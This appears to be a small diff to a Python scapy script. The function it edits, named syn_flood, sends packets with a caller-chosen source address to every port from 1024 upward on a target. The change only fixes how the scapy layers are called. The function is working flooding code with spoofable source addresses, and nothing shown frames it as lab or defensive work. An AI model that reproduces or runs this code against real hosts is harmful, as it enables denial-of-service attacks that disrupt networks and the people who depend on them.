@@ -9,9 +9,9 @@ from scapy.all import *
 
 def syn_flood(src,tgt,message):
     for dport in range(1024, 65535):
-        IPlayer = scapy.IP(src=src, dst=tgt)
-        TCPlayer = scapy.TCP(sport=4444, dport=dport)
-        RAWlayer = scapy.Raw(load=message)
+        IPlayer = IP(src=src, dst=tgt) #scapy.IP not need in linux
+        TCPlayer = TCP(sport=4444, dport=dport)#scapy.TCP not need in linux
+        RAWlayer = Raw(load=message)
         pkt = IPlayer/TCPlayer/RAWlayer
         send(pkt)
         
